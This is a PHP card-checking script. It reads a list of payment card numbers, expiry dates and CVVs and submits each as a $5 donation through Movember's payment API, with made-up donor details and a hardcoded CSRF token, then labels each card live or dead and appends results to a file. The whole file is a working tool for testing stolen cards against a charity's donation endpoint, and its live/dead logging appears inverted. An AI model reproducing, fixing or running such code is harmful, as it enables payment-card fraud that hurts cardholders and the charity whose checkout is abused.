<?php

echo "List CC  : ";
$xyz = trim(fgets(STDIN));
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
	$pecah = explode("|", trim($akun));
	$card = trim($pecah[0]);
	$month = trim($pecah[1]);
	$year = trim($pecah[2]);
	$cvv = trim($pecah[3]);
		
$headers = array();
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';

$gas = curl('https://us.movember.com/api/v18/payment', '{"countryCode":"us","locale":"en_US","source":"online","recipientDetails":{"entityType":"general","entityId":97},"donorAddress":{"address1":"jakarta","address2":"jakarta","suburb":"portland","state":"OR","postcode":"97220","countryCode":"us"},"phoneNumber":"(812) 412-3123","donorDetails":{"email":"dowerarts@gmail.com","firstname":"apri","lastname":"amsyah","message":"","receipt":{"isBusiness":false,"businessName":"","firstname":"apri","lastname":"amsyah","taxId":""},"subscribe":true,"confirm_mov_email":""},"tz":"ICT","giftaid":false,"paymentDetails":{"paymentMethod":"card","amount":"5","currency":"USD","transactionFeeEnabled":true,"creditCard":{"cardNumber":"'.$card.'","cardholderName":"apri amsyah","cardCVV":"'.$cvv.'","cardExpiryMonth":"'.$month.'","cardExpiryYear":"'.$year.'","cardType":{"name":"visa","pattern":{},"valid_length":[16,13]}},"paypal":{},"visaCheckout":{},"masterPass":{},"adyen":{},"directDebit":{}},"donationPrivate":false,"donationAnonymous":false,"cause_id":null,"event_id":null,"recurring":false,"g-recaptcha-response":"","csrfKey":"react-donation-form","csrfToken":"7d442d70a11e9f7c76949403fc48cc430cb8e02cd5417dd86c7e87239e9658b2","browserInfo":{}}', $headers);
if (strpos($gas[1], 'approved')) {
		echo "[Live] $card|$month|$year|$cvv\n";
	} else {	
		echo "[Die] $card|$month|$year|$cvv\n";
		fwrite(fopen("card-live.txt", "a"), "[Live CC] | $card|$month|$year|$cvv\n");
	}
}

function curl($url,$post,$headers)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_HEADER, 1);
	if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	$result = curl_exec($ch);
	$header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	$body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
	preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
	$cookies = array();
	foreach($matches[1] as $item) {
	  parse_str($item, $cookie);
	  $cookies = array_merge($cookies, $cookie);
	}
	return array (
	$header,
	$body,
	$cookies
	);
}